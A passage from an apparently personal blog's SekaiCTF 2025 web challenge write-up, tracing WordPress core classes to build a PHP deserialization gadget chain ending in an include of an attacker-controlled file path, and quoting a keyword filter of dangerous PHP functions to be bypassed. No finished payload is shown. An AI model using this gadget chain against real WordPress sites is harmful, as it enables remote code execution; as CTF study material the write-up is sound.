				<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">attributes</span><span class="p">[</span><span class="s1">'class'</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">value_starts_at</span><span class="p">,</span>
				<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">attributes</span><span class="p">[</span><span class="s1">'class'</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">value_length</span>
			<span class="p">);</span>
		<span class="p">}</span>

		<span class="k">if</span> <span class="p">(</span> <span class="kc">false</span> <span class="o">===</span> <span class="nv">$existing_class</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$existing_class</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
		<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>in the class_name_updates_to_attributes_updates() method, we can see that it checks the class attribute from $this-&gt;attributes</p>

<p><a href="/assets/img/2025/sekaiCTF/8.png" class="popup img-link  shimmer"><img src="/assets/img/2025/sekaiCTF/8.png" alt="" loading="lazy"></a></p>

<p>to understand the next part, it’s important to note that in php, when an object implements the ArrayAccess interface, using array-like syntax to access its elements will automatically call the offsetGet() method</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">attributes</span><span class="p">[</span><span class="s1">'class'</span><span class="p">]</span> 
</pre></td></tr></tbody></table></code></div></div>
<p>so the offsetGet() method of $this-&gt;attributes[‘class’] will be called</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre></td><td class="rouge-code"><pre>  <span class="c1"># WP_Block_List</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">offsetGet</span><span class="p">(</span> <span class="nv">$offset</span> <span class="p">)</span> <span class="p">{</span>
		<span class="nv">$block</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">blocks</span><span class="p">[</span> <span class="nv">$offset</span> <span class="p">];</span>

		<span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span> <span class="nv">$block</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">is_array</span><span class="p">(</span> <span class="nv">$block</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$block</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">WP_Block</span><span class="p">(</span> <span class="nv">$block</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">available_context</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registry</span> <span class="p">);</span>

			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">blocks</span><span class="p">[</span> <span class="nv">$offset</span> <span class="p">]</span> <span class="o">=</span> <span class="nv">$block</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="k">return</span> <span class="nv">$block</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="c1"># class-wp-hook.php</span>
  <span class="mi">477</span><span class="p">,</span><span class="mi">18</span><span class="o">:</span> 	<span class="k">public</span> <span class="k">function</span> <span class="n">offsetGet</span><span class="p">(</span> <span class="nv">$offset</span> <span class="p">)</span> <span class="p">{</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">offsetGet</span><span class="p">(</span> <span class="nv">$offset</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="k">isset</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">callbacks</span><span class="p">[</span> <span class="nv">$offset</span> <span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">callbacks</span><span class="p">[</span> <span class="nv">$offset</span> <span class="p">]</span> <span class="o">:</span> <span class="kc">null</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="c1"># class-wp-theme.php</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">offsetGet</span><span class="p">(</span> <span class="nv">$offset</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">switch</span> <span class="p">(</span> <span class="nv">$offset</span> <span class="p">)</span> <span class="p">{</span>
			<span class="k">case</span> <span class="s1">'Name'</span><span class="o">:</span>
			<span class="k">case</span> <span class="s1">'Title'</span><span class="o">:</span>
				<span class="cm">/*
				 * See note above about using translated data. get() is not ideal.
				 * It is only for backward compatibility. Use display().
				 */</span>
				<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span> <span class="s1">'Name'</span> <span class="p">);</span>
			<span class="k">case</span> <span class="s1">'Author'</span><span class="o">:</span>
				<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span> <span class="s1">'Author'</span> <span class="p">);</span>
			<span class="k">case</span> <span class="s1">'Author Name'</span><span class="o">:</span>
				<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span> <span class="s1">'Author'</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>
			<span class="k">case</span> <span class="s1">'Author URI'</span><span class="o">:</span>
				<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span> <span class="s1">'AuthorURI'</span> <span class="p">);</span>
			<span class="k">case</span> <span class="s1">'Description'</span><span class="o">:</span>
				<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span> <span class="s1">'Description'</span> <span class="p">);</span>
			<span class="k">case</span> <span class="s1">'Version'</span><span class="o">:</span>
			<span class="k">case</span> <span class="s1">'Status'</span><span class="o">:</span>
  <span class="c1"># jar.php</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">offsetGet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cookies</span><span class="p">[</span><span class="nv">$offset</span><span class="p">]))</span> <span class="p">{</span>
			<span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cookies</span><span class="p">[</span><span class="nv">$offset</span><span class="p">];</span>
	<span class="p">}</span>
	
	<span class="c1"># headers.php</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">offsetGet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$offset</span><span class="p">))</span> <span class="p">{</span>
			<span class="nv">$offset</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$offset</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="nv">$offset</span><span class="p">]))</span> <span class="p">{</span>
			<span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">flatten</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="nv">$offset</span><span class="p">]);</span>
	<span class="p">}</span>

	<span class="c1"># CaseInsensitiveDictionary.php</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">offsetGet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$offset</span><span class="p">))</span> <span class="p">{</span>
			<span class="nv">$offset</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$offset</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="nv">$offset</span><span class="p">]))</span> <span class="p">{</span>
			<span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="nv">$offset</span><span class="p">];</span>
	<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>after reviewing the offsetGet() implementations across the available classes, none of them provided a suitable gadget for exploitation</p>

<h3 id="wp_block_list"><span class="me-2">WP_Block_List</span><a href="#wp_block_list" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>	<span class="cd">/**
	 * Returns the value by the specified block offset.
	 *
	 * @since 5.5.0
	 *
	 * @link https://www.php.net/manual/en/arrayaccess.offsetget.php
	 *
	 * @param int $offset Offset of block value to retrieve.
	 * @return WP_Block|null Block value if exists, or null.
	 */</span>
	<span class="na">#[ReturnTypeWillChange]</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">offsetGet</span><span class="p">(</span> <span class="nv">$offset</span> <span class="p">)</span> <span class="p">{</span>
		<span class="nv">$block</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">blocks</span><span class="p">[</span> <span class="nv">$offset</span> <span class="p">];</span>

		<span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span> <span class="nv">$block</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">is_array</span><span class="p">(</span> <span class="nv">$block</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$block</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">WP_Block</span><span class="p">(</span> <span class="nv">$block</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">available_context</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registry</span> <span class="p">);</span>

			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">blocks</span><span class="p">[</span> <span class="nv">$offset</span> <span class="p">]</span> <span class="o">=</span> <span class="nv">$block</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="k">return</span> <span class="nv">$block</span><span class="p">;</span>
	<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>however, inside the offsetGet() method defined in WP_Block_List, i found that it instantiates a WP_Block class</p>

<h3 id="wp_block"><span class="me-2">WP_Block</span><a href="#wp_block" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="na">#[AllowDynamicProperties]</span>
<span class="kd">class</span> <span class="nc">WP_Block</span> <span class="p">{</span>

<span class="c1">// (...)</span>

		<span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span> <span class="nv">$block</span><span class="p">,</span> <span class="nv">$available_context</span> <span class="o">=</span> <span class="k">array</span><span class="p">(),</span> <span class="nv">$registry</span> <span class="o">=</span> <span class="kc">null</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">parsed_block</span> <span class="o">=</span> <span class="nv">$block</span><span class="p">;</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span>         <span class="o">=</span> <span class="nv">$block</span><span class="p">[</span><span class="s1">'blockName'</span><span class="p">];</span>
	
			<span class="k">if</span> <span class="p">(</span> <span class="nb">is_null</span><span class="p">(</span> <span class="nv">$registry</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
				<span class="nv">$registry</span> <span class="o">=</span> <span class="n">WP_Block_Type_Registry</span><span class="o">::</span><span class="nf">get_instance</span><span class="p">();</span>
			<span class="p">}</span>
	
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registry</span> <span class="o">=</span> <span class="nv">$registry</span><span class="p">;</span>
	
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">block_type</span> <span class="o">=</span> <span class="nv">$registry</span><span class="o">-&gt;</span><span class="nf">get_registered</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="p">);</span>
	
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">available_context</span> <span class="o">=</span> <span class="nv">$available_context</span><span class="p">;</span>
	
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">refresh_context_dependents</span><span class="p">();</span>
		<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the WP_Block class is located in the class-wp-block.php file. looking into its __construct() method, we can see that it calls functions like get_instance() and get_registered()</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>	<span class="k">public</span> <span class="k">function</span> <span class="n">get_registered</span><span class="p">(</span> <span class="nv">$pattern_name</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">is_registered</span><span class="p">(</span> <span class="nv">$pattern_name</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="nv">$pattern</span>            <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registered_patterns</span><span class="p">[</span> <span class="nv">$pattern_name</span> <span class="p">];</span>
		<span class="nv">$content</span>            <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">get_content</span><span class="p">(</span> <span class="nv">$pattern_name</span> <span class="p">);</span>
		<span class="nv">$pattern</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">apply_block_hooks_to_content</span><span class="p">(</span>
			<span class="nv">$content</span><span class="p">,</span>
			<span class="nv">$pattern</span><span class="p">,</span>
			<span class="s1">'insert_hooked_blocks_and_set_ignored_hooked_blocks_metadata'</span>
		<span class="p">);</span>

		<span class="k">return</span> <span class="nv">$pattern</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the get_registered() method, as shown above, internally calls the get_content() method</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>	<span class="k">private</span> <span class="k">function</span> <span class="n">get_content</span><span class="p">(</span> <span class="nv">$pattern_name</span><span class="p">,</span> <span class="nv">$outside_init_only</span> <span class="o">=</span> <span class="kc">false</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span> <span class="nv">$outside_init_only</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$patterns</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registered_patterns_outside_init</span><span class="p">;</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="nv">$patterns</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registered_patterns</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">isset</span><span class="p">(</span> <span class="nv">$patterns</span><span class="p">[</span> <span class="nv">$pattern_name</span> <span class="p">][</span><span class="s1">'content'</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span> <span class="nv">$patterns</span><span class="p">[</span> <span class="nv">$pattern_name</span> <span class="p">][</span><span class="s1">'filePath'</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nb">ob_start</span><span class="p">();</span>
			<span class="k">include</span> <span class="nv">$patterns</span><span class="p">[</span> <span class="nv">$pattern_name</span> <span class="p">][</span><span class="s1">'filePath'</span><span class="p">];</span>
			<span class="nv">$patterns</span><span class="p">[</span> <span class="nv">$pattern_name</span> <span class="p">][</span><span class="s1">'content'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
			<span class="k">unset</span><span class="p">(</span> <span class="nv">$patterns</span><span class="p">[</span> <span class="nv">$pattern_name</span> <span class="p">][</span><span class="s1">'filePath'</span><span class="p">]</span> <span class="p">);</span>
		<span class="p">}</span>
		<span class="k">return</span> <span class="nv">$patterns</span><span class="p">[</span> <span class="nv">$pattern_name</span> <span class="p">][</span><span class="s1">'content'</span><span class="p">];</span>
	<span class="p">}</span>
	
<span class="c1">// class-wp-block-patterns-registry.php</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the get_content() method is shown above, and the code passes $patterns[$pattern_name][‘filePath’] directly into an include. this immediately suggests a possible attack vector</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>        <span class="nv">$suspiciousKeywords</span> <span class="o">=</span> <span class="p">[</span>
            <span class="s1">'eval'</span><span class="p">,</span> <span class="s1">'exec'</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">,</span> <span class="s1">'shell_exec'</span><span class="p">,</span> <span class="s1">'passthru'</span><span class="p">,</span>
            <span class="s1">'file_get_contents'</span><span class="p">,</span> <span class="s1">'fopen'</span><span class="p">,</span> <span class="s1">'fwrite'</span><span class="p">,</span> <span class="s1">'unlink'</span><span class="p">,</span>
            <span class="s1">'base64_decode'</span><span class="p">,</span> <span class="s1">'gzinflate'</span><span class="p">,</span> <span class="s1">'str_rot13'</span>
        <span class="p">];</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Looking at the fancy code, it seems that these values are being filtered, which means we need to bypass the filter in order to exploit it. aside from using tricks like convert.iconv to bypass filtering and achieve rce, the only viable approach is to find a code path where functions such as include, include_once, or file_get_contents are called. the include statement we identified above can serve as the final gadget for this attack</p>

<p>in other words, by crafting a serialized payload that chains together SecureTableGenerator → WP_HTML_Tag_Processor → WP_Block_List → WP_Block in reverse order with carefully aligned arguments, and then base64-decoding it before sending it as the serialized_data body parameter, the challenge can potentially be solved</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Sekai%202025%20Write%20Up%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FSekai-CTF-2025%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Sekai%202025%20Write%20Up%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FSekai-CTF-2025%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FSekai-CTF-2025%2F&text=Sekai%202025%20Write%20Up%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/Hayyim-CTF/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1644794993"
  data-df="ll"
  
>
  Feb 14, 2022
</time>

              <h4 class="pt-0 my-2">Hayyim CTF 2022 Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  Summary

This weekend, Hayyim Security hosted the CTF, and I participated in it for about 3 ~ 4 hours and I was solved Cyberchef, Not E and Cyber Headchef challenges.



(Web) Cyberchef [100 pts]

...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/GoN-CTF/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1647905393"
  data-df="ll"
  
>
  Mar 22, 2022
</time>

              <h4 class="pt-0 my-2">Spring GoN Open Qual CTF 2022 Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  Summary

This time I did participate in CTF because GoN team of Kaist hosted the CTF. I was hacking to dawn after long time and I solved two challenges:ColorfulMemo, NSS.


  Summary
    
      (Q)...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/Line-CTF-2022/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1648371653"
  data-df="ll"
  
>
  Mar 27, 2022
</time>

              <h4 class="pt-0 my-2">Line CTF 2022 Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  Summary


  Summary
  (Web) gotm
  (Web) online-library


I participated a Line CTF 2022 this saturday and I only solved the one challenge in this ctf.

So I am very not good. Just get a stress. So...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Just-CTF-2025/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>JustCTF 2025 Positive Players Write Up</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
style="background-color:#030014"
>

</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
